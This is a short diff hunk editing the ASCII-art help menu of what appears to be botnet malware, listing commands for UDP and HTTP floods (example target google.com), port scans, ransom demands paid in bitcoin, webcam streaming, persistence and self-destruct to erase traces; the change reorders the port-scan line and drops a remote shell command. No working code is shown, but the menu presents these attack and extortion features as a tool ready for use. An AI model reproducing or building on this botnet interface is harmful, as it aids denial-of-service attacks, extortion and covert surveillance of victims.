@@ -3,11 +3,10 @@
                                           ║             COMMAND             ║
           ╔═══════════════════════════════╩═════════════════════════════════╩══════════════════════════════╗
           ║     attack <method> <ip> <port> <t> <thread>   ║     attack udp 127.0.0.1 80 60 100            ║
-          ║     pscan <ip> <startport> <endport> <thread>  ║     pscan bot 127.0.0.1 1 100 100             ║
           ║     ddos <method> <url> <thread> <t>           ║     ddos cfb https://google.com 10 5          ║
+          ║     pscan <ip> <startport> <endport> <thread>  ║     pscan bot 127.0.0.1 1 100 100             ║
           ║     ransom <price> <email> <btc>               ║     ransom $100 mail@mail.com BTC             ║  
           ║     webcam <ip> <port>                         ║     Stream webcam footage                     ║
-          ║     shell <command>                            ║     Run shell commands                        ║
           ║     kill                                       ║     Stop client from listening                ║
           ║     persistence                                ║     Set persistence                           ║
           ║     selfdestruct                               ║     Remove all traces of the BotNet           ║
